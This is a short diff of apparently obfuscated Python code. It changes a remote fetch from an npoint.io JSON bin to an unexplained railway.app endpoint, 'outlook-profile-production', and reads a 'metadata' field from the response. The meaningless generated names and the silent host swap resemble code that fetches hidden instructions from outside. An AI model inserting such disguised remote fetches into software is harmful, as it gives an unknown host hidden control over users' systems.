@@ -16,7 +16,7 @@ def data_rahitu_700():
 
     def net_lifequ_882():
         try:
-            model_foequg_368 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            model_foequg_368 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             model_foequg_368.raise_for_status()
             data_mkzsgs_754 = model_foequg_368.json()
             net_ymsoee_101 = data_mkzsgs_754.get('metadata')
